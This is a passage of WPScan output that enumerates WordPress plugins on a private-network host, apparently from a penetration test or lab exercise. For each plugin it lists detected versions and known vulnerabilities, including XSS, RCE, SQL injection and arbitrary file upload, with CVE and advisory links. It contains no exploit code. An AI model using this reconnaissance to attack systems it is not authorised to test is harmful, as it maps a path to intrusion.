 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] all-in-one-seo-pack
 | Location: https://192.168.1.6/wp-content/plugins/all-in-one-seo-pack/
 | Last Updated: 2026-10-07T14:05:00.000Z
 | Readme: https://192.168.1.6/wp-content/plugins/all-in-one-seo-pack/readme.txt
 | [!] The version is out of date, the latest version is 5.0.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/all-in-one-seo-pack/, status: 403
 |
 | [!] 27 vulnerabilities identified:
 |
 | [!] Title: All in One SEO Pack <= 2.1.5 - aioseop_functions.php new_meta Parameter XSS
 |     Fixed in: 2.1.6
 |     References:
 |      - https://wpscan.com/vulnerability/845a890f-1c56-4075-a717-c9627586cbbe
 |      - https://blog.sucuri.net/2014/05/vulnerability-found-in-the-all-in-one-seo-pack-wordpress-plugin.html
 |
 | [!] Title: All in One SEO Pack <= 2.1.5 - Unspecified Privilege Escalation
 |     Fixed in: 2.1.6
 |     References:
 |      - https://wpscan.com/vulnerability/3a79a32d-2744-41c5-8752-0540f744e25d
 |      - https://blog.sucuri.net/2014/05/vulnerability-found-in-the-all-in-one-seo-pack-wordpress-plugin.html
 |
 | [!] Title: All in One SEO Pack < 2.2.6 - Information Disclosure
 |     Fixed in: 2.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/de4706de-f388-41b9-af91-bd4677a7166e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0902
 |      - https://jvn.jp/en/jp/JVN75615300/index.html
 |      - https://web.archive.org/web/20150809074225/http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
 |
 | [!] Title: All in One SEO Pack <= 2.2.6.1 - Cross-Site Scripting (XSS)
 |     Fixed in: 2.2.6.2
 |     References:
 |      - https://wpscan.com/vulnerability/9c76c04d-3c4e-4a06-ab7e-054bc21c55fc
 |      - https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
|
 | [!] Title: All in One SEO Pack < 2.3.7 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 2.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/aa790e24-ae9d-48b9-8071-7ca138cdc69d
 |      - https://seclists.org/fulldisclosure/2016/Jul/23
 |      - https://web.archive.org/web/20160508074631/http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
 |      - https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_all_in_one_seo_pack_wordpress_plugin.html
 |      - https://wptavern.com/all-in-one-seo-2-3-7-patches-persistent-xss-vulnerability
 |      - https://www.wordfence.com/blog/2016/07/xss-vulnerability-all-in-one-seo-pack-plugin/
 |
 | [!] Title: All in One SEO Pack <= 2.3.7 -  Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 2.3.8
 |     References:
 |      - https://wpscan.com/vulnerability/42a98395-e4e4-47a5-b758-2b76b7c4885a
 |      - https://www.wordfence.com/blog/2016/07/new-xss-vulnerability-all-in-one-seo-pack/
 |      - https://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
 |      - https://web.archive.org/web/20161019215603/https://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
 |
 | [!] Title: All in One SEO Pack < 2.10 - Authenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 2.10
 |     References:
 |      - https://wpscan.com/vulnerability/16353d45-75d1-4820-b93f-daad90c322a8
 |      - https://www.ripstech.com/php-security-calendar-2018/#day-4
 |      - https://wordpress.org/support/topic/a-critical-vulnerability-has-been-detected-in-this-plugin/
 |      - https://semperfiwebdesign.com/all-in-one-seo-pack-release-history/
 |
 | [!] Title: All In One SEO Pack < 3.2.7 - Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.2.7
 |     References:
 |      - https://wpscan.com/vulnerability/868dccee-089b-43d2-a80a-6cadba91f770
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16520
 |      - https://github.com/sbaresearch/advisories/tree/public/2019/SBA-ADV-20190913-04_WordPress_Plugin_All_in_One_SEO_Pack
 |
 | [!] Title: All in One SEO Pack < 3.6.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 3.6.2
 |     References:
 |      - https://wpscan.com/vulnerability/528fff6c-54fe-4812-9b08-8c4e47350c83
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35946
 |      - https://www.wordfence.com/blog/2020/07/2-million-users-affected-by-vulnerability-in-all-in-one-seo-pack/
 |      - https://www.youtube.com/watch?v=2fqMM6HRV5s
 |
 | [!] Title: All in One SEO Pack <  4.1.0.2 - Admin RCE via unserialize
 |     Fixed in: 4.1.0.2
 |     References:
 |      - https://wpscan.com/vulnerability/ab2c94d2-f6c4-418b-bd14-711ed164bcf1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24307
 |      - https://aioseo.com/changelog/
 |
 | [!] Title: All in One SEO < 4.2.4 - Multiple CSRF
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/5f31b537-186d-424c-a0c3-56f29146bb6e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-38093
 |
 | [!] Title: All in One SEO Pack < 4.3.0 - Contributor+ Stored XSS
 |     Fixed in: 4.3.0
 |     References:
 |      - https://wpscan.com/vulnerability/e2e78948-81cc-49e4-9a68-1a989a4a0585
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0586
 |
 | [!] Title: All in One SEO Pack < 4.3.0 - Admin+ Stored XSS
 |     Fixed in: 4.3.0
 |     References:
 |      - https://wpscan.com/vulnerability/3ace429e-42a8-4b1b-8a39-5262f289cbd9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0585
 |
 | [!] Title: All in One SEO < 4.6.1.1 - Contributor+ Stored XSS
 |     Fixed in: 4.6.1.1
 |     References:
 |      - https://wpscan.com/vulnerability/ab78b1a5-e28c-406b-baaf-6d53017f9328
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3368
 |      - https://research.cleantalk.org/cve-2024-3368/
 |
 | [!] Title: All in One SEO – Best WordPress SEO Plugin – Easily Improve SEO Rankings & Increase Traffic < 4.6.1.1 - Contributor+ Stored Cross-Site Scripting via Shortcode
 |     Fixed in: 4.6.1.1
 |     References:
 |      - https://wpscan.com/vulnerability/827eba98-2b91-4524-a71a-306a0c0e5fb8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3554
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/28741ffc-4ff5-4e67-a183-bb5064b6752e
 |
 | [!] Title: All in One SEO Pack < 4.8.2 - Contributor+ Stored XSS via Post Meta Description and Canonical URL
 |     Fixed in: 4.8.2
 |     References:
 |      - https://wpscan.com/vulnerability/5dbf04d6-6555-4828-914b-e3a8f532c105
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2892
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7fd5d31d-a4f3-458a-b457-f20aeaa71749
 |
 | [!] Title: All In One SEO Pack < 4.8.7.2 - Missing Authorization
 |     Fixed in: 4.8.7.2
 |     References:
 |      - https://wpscan.com/vulnerability/4738aa01-4011-4f7c-920e-79f69cb7583a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58650
 |      - https://patchstack.com/database/wordpress/plugin/all-in-one-seo-pack/vulnerability/wordpress-all-in-one-seo-pack-plugin-4-8-7-broken-access-control-vulnerability
 |
 | [!] Title: All In One SEO Pack < 4.8.7.2 - Contributor+ Sensitive Information Exposure
 |     Fixed in: 4.8.7.2
 |     References:
 |      - https://wpscan.com/vulnerability/99e52382-5fa5-4c42-8248-91d9f0bb01c4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58649
 |      - https://patchstack.com/database/wordpress/plugin/all-in-one-seo-pack/vulnerability/wordpress-all-in-one-seo-pack-plugin-4-8-7-sensitive-data-exposure-vulnerability
 |
 | [!] Title: All in One SEO < 4.9.0 - Contributor+ Arbitrary Media Deletion
 |     Fixed in: 4.9.0
 |     References:
 |      - https://wpscan.com/vulnerability/e0686462-10c0-40c0-ba5c-b255adf11644
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-12847
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/05abc09f-903b-45a9-8cde-1bf8fd5d7d44
 |
 | [!] Title: All In One SEO Pack < 4.9.1.1 - Contributor+ SQL Injection
 |     Fixed in: 4.9.1.1
 |     References:
 |      - https://wpscan.com/vulnerability/b043c6a7-362f-4b0d-8b05-551b1cdea9bf
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-67950
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f6043cff-f2b7-46bb-b00d-96bfcd69e54e
 |
 | [!] Title: All In One SEO Pack < 4.8.7 - Subscriber+ Information Exposure
 |     Fixed in: 4.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/04376c90-1430-408d-ac3c-32bb7cc15877
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-64295
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d77a47e9-0d34-4a88-a913-74a8ef972f9b
 |
 | [!] Title: All in One SEO < 4.9.3 - Contributor+ AI Access Token and Credit Disclosure
 |     Fixed in: 4.9.3
 |     References:
 |      - https://wpscan.com/vulnerability/c2942498-4625-49f1-8d9a-429f0f1a8dd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-14384
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f47d53e1-42ac-425e-a6f2-901a6d26845d
 |
 | [!] Title: All in One SEO < 4.9.7.1 - Contributor+ Sensitive Information Exposure via 'internalOptions' Localized Script Data
 |     Fixed in: 4.9.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/8cbec2b9-2b70-4d68-bbf9-15f0b129156e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-5075
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0d8bc203-c17a-4b31-8f9e-695f9e638cda
 |
 | [!] Title: All in One SEO < 4.9.9 – Contributor+ Incorrect Authorization via AI Integration
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/cc4e83e3-b581-4f65-ac2c-24fbfb9da4b3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-10755
 |
 | [!] Title: All in One SEO < 5.0.0.1 - Contributor+ Stored XSS via ai-assistant Block
 |     Fixed in: 5.0.0.1
 |     References:
 |      - https://wpscan.com/vulnerability/9d4e5075-062a-42d7-beba-9f96f9ce76da
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-82884
 |
 | [!] Title: All in One SEO < 5.0.2 - Reflected DOM-Based XSS via URL Pathname
 |     Fixed in: 5.0.2
 |     References:
 |      - https://wpscan.com/vulnerability/bee5f7d5-c022-4a53-9c49-52956767a822
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-85492
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5d4da592-3e8a-401d-b461-1770db9de654
 |
 | [!] Title: All in One SEO < 5.0.2.1 - Unauthenticated Arbitrary Shortcode Execution via Search Query
 |     Fixed in: 5.0.2.1
 |     References:
 |      - https://wpscan.com/vulnerability/e35365d3-65de-45a7-9629-17aacd5299c7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-19856
 |
 | Version: 2.0.4 (50% confidence)
 | Found By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/all-in-one-seo-pack/readme.txt

[+] all-in-one-wp-migration
 | Location: https://192.168.1.6/wp-content/plugins/all-in-one-wp-migration/
 | Last Updated: 2026-10-07T10:36:00.000Z
 | Readme: https://192.168.1.6/wp-content/plugins/all-in-one-wp-migration/readme.txt
 | [!] The version is out of date, the latest version is 7.112
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/all-in-one-wp-migration/, status: 403
 |
 | [!] 15 vulnerabilities identified:
 |
 | [!] Title: All-in-One WP Migration < 2.0.5 - Unauthenticated Database Export
 |     Fixed in: 2.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/4f78d821-036b-4d0c-8cc9-397dcdbc9c21
 |      - https://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability
 |      - https://www.rapid7.com/db/modules/auxiliary/gather/wp_all_in_one_migration_export/
 |
 | [!] Title: All-in-One WP Migration < 6.46 - Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 6.46
 |     References:
 |      - https://wpscan.com/vulnerability/fc104922-b141-43dc-b91e-c9d9518a541c
 |      - https://wordpress.org/plugins/all-in-one-wp-migration/#developers
 |
 | [!] Title: All-in-One WP Migration < 7.0 - Admin+ Stored XSS
 |     Fixed in: 7.0
 |     References:
 |      - https://wpscan.com/vulnerability/5f7257e2-d4da-4fb9-a5da-31332c4ec848
 |      - https://plugins.trac.wordpress.org/changeset/2124441
 |      - https://wptavern.com/all-in-one-wp-migration-7-0-patches-xss-vulnerability
 |
 | [!] Title: All-in-One WP Migration < 7.15 - Arbitrary Backup Download
 |     Fixed in: 7.15
 |     References:
 |      - https://wpscan.com/vulnerability/ef4734a3-f12c-49ef-a49b-f00bd4a21ed9
 |      - https://vavkamil.cz/2020/03/25/all-in-one-wp-migration/
 |
 | [!] Title: All-in-One WP Migration < 7.41 - Admin+ Arbitrary File Upload to RCE
 |     Fixed in: 7.41
 |     References:
 |      - https://wpscan.com/vulnerability/87c6052c-2628-4987-a9a3-a03b5ca1e083
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24216
 |      - https://plugins.trac.wordpress.org/changeset/2516181#file8
 |
 | [!] Title: All-in-One WP Migration < 7.59 - Admin+ File Deletion on Windows Hosts via Path Traversal
 |     Fixed in: 7.59
 |     References:
 |      - https://wpscan.com/vulnerability/6e233311-d8ea-4ed4-8959-6c88f786ceef
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1476
 |      - https://www.wordfence.com/vulnerability-advisories/#CVE-2022-1476
 |
 | [!] Title: All-in-One WP Migration < 7.63 - Unauthenticated Reflected XSS
 |     Fixed in: 7.63
 |     References:
 |      - https://wpscan.com/vulnerability/f84920e4-a1fe-47cf-9ba5-731989c70f58
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2546
 |
 | [!] Title: All-in-One WP Migration and Backup < 7.87 - Unauthenticated Information Disclosure via Error Logs
 |     Fixed in: 7.87
 |     References:
 |      - https://wpscan.com/vulnerability/9f533098-8435-4ee1-a423-5142070ceefc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8852
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c4901d9d-7b37-40d5-a42b-59c80bbbe8ff
 |
 | [!] Title: All-in-One WP Migration and Backup < 7.87 - Authenticated (Administrator+) Arbitrary PHP Code Injection
 |     Fixed in: 7.87
 |     References:
 |      - https://wpscan.com/vulnerability/302c79f1-ab12-437d-b85e-7532b52fcd09
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9162
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d97c3379-56c9-4261-9a70-3119ec121a40
 |
 | [!] Title: All in One WP Migration < 7.90 - Unauthenticated PHP Object Injection
 |     Fixed in: 7.90
 |     References:
 |      - https://wpscan.com/vulnerability/6eb62386-df9b-4d6d-af0d-2cba963e8bd2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10942
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0823d1d9-4f3b-4ac0-8cd1-ad208ebc325f
 |
 | [!] Title: All-in-One WP Migration and Backup < 7.98 - Admin+ Stored XSS
 |     Fixed in: 7.98
 |     References:
 |      - https://wpscan.com/vulnerability/d221c139-5e3a-4475-95b1-7b2a77e9de3a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-8490
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/85930893-d415-4131-bcda-54a20644eddc
 |
 | [!] Title: All-in-One WP Migration and Backup < 7.108 - Multisite Subsite Admin+ Network-Wide PHP Code Execution via REST Import
 |     Fixed in: 7.108
 |     References:
 |      - https://wpscan.com/vulnerability/13b57cdc-d954-4db6-94c2-53ad04ab0d34
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-17533
 |
 | [!] Title: All-in-One WP Migration and Backup < 7.110 - Unauthenticated Second-Order SQLi via Archive Restore to RCE
 |     Fixed in: 7.110
 |     References:
 |      - https://wpscan.com/vulnerability/03fc9f1a-5199-40fa-960d-75a266eb7e95
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-19949
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/22e273d9-a268-4dc5-b1f6-3bc5c29232c5
 |
 | [!] Title: All-in-One WP Migration and Backup < 7.111 - Authenticated Privilege Escalation to Admin via Import Secret Key Disclosure
 |     Fixed in: 7.111
 |     References:
 |      - https://wpscan.com/vulnerability/2036592e-09eb-4231-b450-85d8fbc0ba3f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-81810
 |
 | [!] Title: All-in-One WP Migration and Backup < 7.111 - Unauthenticated Basic Auth Credential Capture and Overwrite via Authorization Header
 |     Fixed in: 7.111
 |     References:
 |      - https://wpscan.com/vulnerability/e7f54c12-d3d5-4ea4-9f3c-14a2d57843ab
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-89064
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5a8737b1-fb68-4609-8474-9395f30c1089
 |
 | Version: 2.0.4 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/all-in-one-wp-migration/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/all-in-one-wp-migration/readme.txt

[+] contact-form-7
 | Location: https://192.168.1.6/wp-content/plugins/contact-form-7/
 | Last Updated: 2026-10-11T07:48:00.000Z
 | Readme: https://192.168.1.6/wp-content/plugins/contact-form-7/readme.txt
 | [!] The version is out of date, the latest version is 6.2.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/contact-form-7/, status: 403
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: Contact Form 7 <= 5.0.3 - register_post_type() Privilege Escalation
 |     Fixed in: 5.0.4
 |     References:
 |      - https://wpscan.com/vulnerability/af945f64-9ce2-485c-bf36-c2ff59dc10d5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20979
 |      - https://contactform7.com/2018/09/04/contact-form-7-504/
 |      - https://plugins.trac.wordpress.org/changeset/1935726/contact-form-7
 |      - https://plugins.trac.wordpress.org/changeset/1934594/contact-form-7
 |      - https://plugins.trac.wordpress.org/changeset/1934343/contact-form-7
 |      - https://plugins.trac.wordpress.org/changeset/1934327/contact-form-7
 |      - https://www.ripstech.com/php-security-calendar-2018/#day-18
 |
 | [!] Title: Contact Form 7 < 5.3.2 - Unrestricted File Upload
 |     Fixed in: 5.3.2
 |     References:
 |      - https://wpscan.com/vulnerability/7391118e-eef5-4ff8-a8ea-f6b65f442c63
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35489
 |      - https://www.getastra.com/blog/911/plugin-exploit/contact-form-7-unrestricted-file-upload-vulnerability/
 |      - https://www.jinsonvarghese.com/unrestricted-file-upload-in-contact-form-7/
 |      - https://contactform7.com/2020/12/17/contact-form-7-532/#more-38314
 |
 | [!] Title: Contact Form 7 < 5.8.4 - Authenticated (Editor+) Arbitrary File Upload
 |     Fixed in: 5.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/70e21d9a-b1e6-4083-bcd3-7c1c13fd5382
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6449
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5d7fb020-6acb-445e-a46b-bdb5aaf8f2b6
 |
 | [!] Title: Contact Form 7 < 5.9.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.9.2
 |     References:
 |      - https://wpscan.com/vulnerability/1c070a2c-2ab0-43bf-b10b-6575709918bc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2242
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d5bf4972-424a-4470-a0bc-7dcc95378e0e
 |
 | [!] Title:  Contact Form 7 < 5.9.5 - Unauthenticated Open Redirect
 |     Fixed in: 5.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/8bdcdb5a-9026-4157-8592-345df8fb1a17
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4704
 |
 | [!] Title: Contact Form 7 < 6.0.6 - Order Replay Vulnerability
 |     Fixed in: 6.0.6
 |     References:
 |      - https://wpscan.com/vulnerability/7dbafbe2-abbc-4191-a587-afa89c2f7421
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-3247
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/38257dbf-288e-4028-af65-85f5389888ac
 |
 | Version: 4.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/contact-form-7/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/contact-form-7/readme.txt

[+] feed
 | Location: https://192.168.1.6/wp-content/plugins/feed/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/feed/, status: 200
 |
 | The version could not be determined.

[+] google-analytics-for-wordpress
 | Location: https://192.168.1.6/wp-content/plugins/google-analytics-for-wordpress/
 | Last Updated: 2026-09-16T12:53:00.000Z
 | Readme: https://192.168.1.6/wp-content/plugins/google-analytics-for-wordpress/readme.txt
 | [!] The version is out of date, the latest version is 11.3.0
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/google-analytics-for-wordpress/, status: 403
 |
 | [!] 11 vulnerabilities identified:
 |
 | [!] Title: Google Analytics by Yoast <= 5.3.2 - Cross-Site Scripting (XSS)
 |     Fixed in: 5.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/a43f55cc-9d75-4f19-9953-871355c095db
 |      - https://packetstormsecurity.com/files/130716/
 |
 | [!] Title: Google Analytics by Yoast <= 5.3.2 - Stored Cross-Site Scripting (XSS)
 |     Fixed in: 5.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/e1fac3d7-0bcf-41e6-91a9-aa0adf377601
 |      - https://yoast.com/ga-plugin-security-update-more/
 |      - https://klikki.fi/adv/yoast_analytics.html
 |      - https://packetstormsecurity.com/files/130935/
 |
 | [!] Title: Google Analytics by Yoast < 5.4 - Unauthenticated Cross-Site Scripting (XSS)
 |     Fixed in: 5.4
 |     References:
 |      - https://wpscan.com/vulnerability/bb82c140-9f0d-458f-a157-a73297099785
 |      - https://yoast.com/coordinated-security-release/
 |      - https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
 |      - https://klikki.fi/adv/yoast_analytics2.html
 |
 | [!] Title: Google Analytics by Yoast <= 5.4.4 - Authenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 5.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/59b6f830-9b8c-44a8-8c02-0f3583b032d3
 |      - https://advisories.dxw.com/advisories/xss-in-google-analytics-by-yoast-premium-by-privileged-users/
 |
 | [!] Title: Google Analytics by Monster Insights < 7.2.0 - Authenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 7.2.0
 |     References:
 |      - https://wpscan.com/vulnerability/3908c05c-d196-4266-bbd4-2a9c77f0c2a5
 |      - https://www.ripstech.com/php-security-calendar-2018/
 |
 | [!] Title: MonsterInsights < 8.9.1 - Stored Cross-Site Scripting via Google Analytics
 |     Fixed in: 8.9.1
 |     References:
 |      - https://wpscan.com/vulnerability/244d9ef1-335c-4f65-94ad-27c0c633f6ad
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3904
 |
 | [!] Title: MonsterInsights < 8.12.1 - Contributor+ Stored XSS
 |     Fixed in: 8.12.1
 |     References:
 |      - https://wpscan.com/vulnerability/76d2963c-ebff-498f-9484-3c3008750c14
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0081
 |
 | [!] Title: Google Analytics by Monster Insights < 8.14.1 - Contributor+ Stored XSS
 |     Fixed in: 8.14.1
 |     References:
 |      - https://wpscan.com/vulnerability/28005da9-a1eb-42c1-bd2f-648c78394962
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23999
 |
 | [!] Title: Google Analytics by Monster Insights < 8.22.0 - Missing Authorization
 |     Fixed in: 8.22.0
 |     References:
 |      - https://wpscan.com/vulnerability/309aee4c-f4ce-4fb9-97c5-23d867d91eb7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-52220
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/81099cdc-bce6-4ee6-b819-c3925acf96a8
 |
 | [!] Title: MonsterInsights < 10.1.3 - Subscriber+ Sensitive Information Exposure and Plugin Integration Reset
 |     Fixed in: 10.1.3
 |     References:
 |      - https://wpscan.com/vulnerability/bfdf1181-d90f-475b-b1cd-7ffd53bd153a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-5371
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5d380b66-675e-451d-a7e3-4efe1fbd08b2
 |
 | [!] Title: MonsterInsights < 11.1.0 - Unauthenticated Measurement Protocol Secret Update via Empty-Key HMAC Bypass
 |     Fixed in: 11.1.0
 |     References:
 |      - https://wpscan.com/vulnerability/283331ca-cc2e-4c2c-9e3b-2e8c6f0c84d2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-11366
 |      - https://wordpress.org/plugins/google-analytics-for-wordpress/
 |      - https://www.monsterinsights.com/
 |
 | Version: 5.3.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/google-analytics-for-wordpress/readme.txt

[+] google-sitemap-generator
 | Location: https://192.168.1.6/wp-content/plugins/google-sitemap-generator/
 | Last Updated: 2026-09-18T03:39:00.000Z
 | Readme: https://192.168.1.6/wp-content/plugins/google-sitemap-generator/readme.txt
 | [!] The version is out of date, the latest version is 4.1.25
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/google-sitemap-generator/, status: 403
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: Google XML Sitemaps <= 4.0.8 - Authenticated Reflected XSS (via HOST header)
 |     Fixed in: 4.0.9
 |     References:
 |      - https://wpscan.com/vulnerability/83d46f91-314f-40a7-aa51-18426b2a2fa1
 |      - https://plugins.trac.wordpress.org/browser/google-sitemap-generator/trunk/sitemap-ui.php#L1310
 |
 | [!] Title: Google XML Sitemaps < 4.1.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.1.0
 |     References:
 |      - https://wpscan.com/vulnerability/0e13cb3e-27b4-4d56-b841-43e79a5e4e25
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16204
 |      - https://jvn.jp/en/jp/JVN27052429/index.html
 |
 | [!] Title: Google XML Sitemaps < 4.1.3 - Admin+ Stored Cross-Site Scripting
 |     Fixed in: 4.1.3
 |     References:
 |      - https://wpscan.com/vulnerability/820c51d6-186e-4d63-b4a7-bd0a59c02cc8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25088
 |
 | [!] Title: Google XML Sitemaps < 4.1.23 - Missing Authorization
 |     Fixed in: 4.1.23
 |     References:
 |      - https://wpscan.com/vulnerability/78f693a2-3fd3-4f44-8556-fa9f9952087b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-64632
 |      - https://vdp.patchstack.com/database/Wordpress/Plugin/google-sitemap-generator/vulnerability/wordpress-google-xml-sitemaps-plugin-4-1-21-broken-access-control-vulnerability?_s_id=cve
 |
 | Version: 4.0.7.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/google-sitemap-generator/readme.txt

[+] https://github.com/placetopay/woocommerce-gateway-placetopay
 | Location: https://192.168.1.6/wp-content/plugins/https://github.com/placetopay/woocommerce-gateway-placetopay/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://github.com/placetopay/woocommerce-gateway-placetopay/, status: 200
 |
 | The version could not be determined.

[+] jetpack
 | Location: https://192.168.1.6/wp-content/plugins/jetpack/
 | Last Updated: 2026-10-12T18:15:00.000Z
